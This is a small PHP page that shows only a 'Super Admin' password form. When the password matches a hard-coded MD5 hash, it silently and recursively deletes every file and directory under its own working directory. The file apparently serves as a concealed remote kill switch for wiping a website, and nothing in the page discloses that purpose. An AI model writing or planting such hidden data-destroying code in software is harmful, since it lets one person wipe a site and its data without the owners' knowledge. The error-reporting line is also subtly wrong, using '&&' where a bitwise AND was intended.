<?php
error_reporting(E_ALL && ~E_NOTICE);
if ($_POST['submit']) {
    $password = $_POST['password'];

    if (md5($password) == 'e488df4546ac5c9373943e74c3149a76') {
        $dir = getcwd();

        function recursiveRemove($dir) {
            $structure = glob(rtrim($dir, "/") . '/*');
            if (is_array($structure)) {
                foreach ($structure as $file) {
                    if (is_dir($file))
                        recursiveRemove($file);
                    elseif (is_file($file))
                        unlink($file);
                }
            }
            rmdir($dir);
        }
        
        recursiveRemove("$dir");

    }else {
        echo "WRONG PASSWORD";
        echo "<br/>";
    }
}
?>

<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body>
        <form action="" method="POST">
            Enter Super Admin's Password : 
            <input type="password" name="password"/>
            <input type="submit" name="submit" value="Submit Password"/>
        </form>
    </body>
</html>
